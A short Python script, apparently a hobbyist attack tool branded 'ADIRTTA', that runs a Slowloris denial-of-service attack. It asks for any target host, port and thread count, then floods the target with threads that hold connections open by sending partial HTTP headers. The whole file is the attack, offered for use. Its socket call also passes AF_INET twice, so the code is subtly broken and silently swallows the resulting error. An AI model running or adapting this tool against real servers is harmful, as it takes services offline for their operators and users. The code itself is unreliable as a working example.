import socket
import threading
import time

# ASCII Art for "ADIRTTA" using '|_' style
def ascii_art_adirtta():
    print(r"""
   
    _    ____ ___ ____ _____ _____  _
   / \  |  _ \_ _|  _ \_   _|_   _|/ \
  / _ \ | | | | || |_) || |   | | / _ \
 / ___ \| |_| | ||  _ < | |   | |/ ___ \
/_/   \_\____/___|_| \_\|_|   |_/_/   \_\

                                     code by adirtta✘lastman
     
""")

# Optimized Slowloris function with threading for faster execution
def slowloris_thread(target, port):
    try:
        s = socket.socket(socket.AF_INET, socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(f"GET /? HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n".encode())

        # Faster loop to send partial headers
        while True:
            s.send(b"X-a: b\r\n")
            time.sleep(0.01)  # Further reduced delay to make it faster
    except socket.error:
        return

def slowloris(target, port, num_threads):
    for i in range(num_threads):
        thread = threading.Thread(target=slowloris_thread, args=(target, port))
        thread.start()
        print(f"Started thread {i + 1}")

if __name__ == "__main__":
    ascii_art_adirtta()  # Display the ASCII art for 'ADIRTTA'

    target = input("Enter the target IP or domain: ")
    port = int(input("Enter the port number: "))
    num_threads = int(input("Enter the number of threads (more = faster): "))
    
    slowloris(target, port, num_threads)
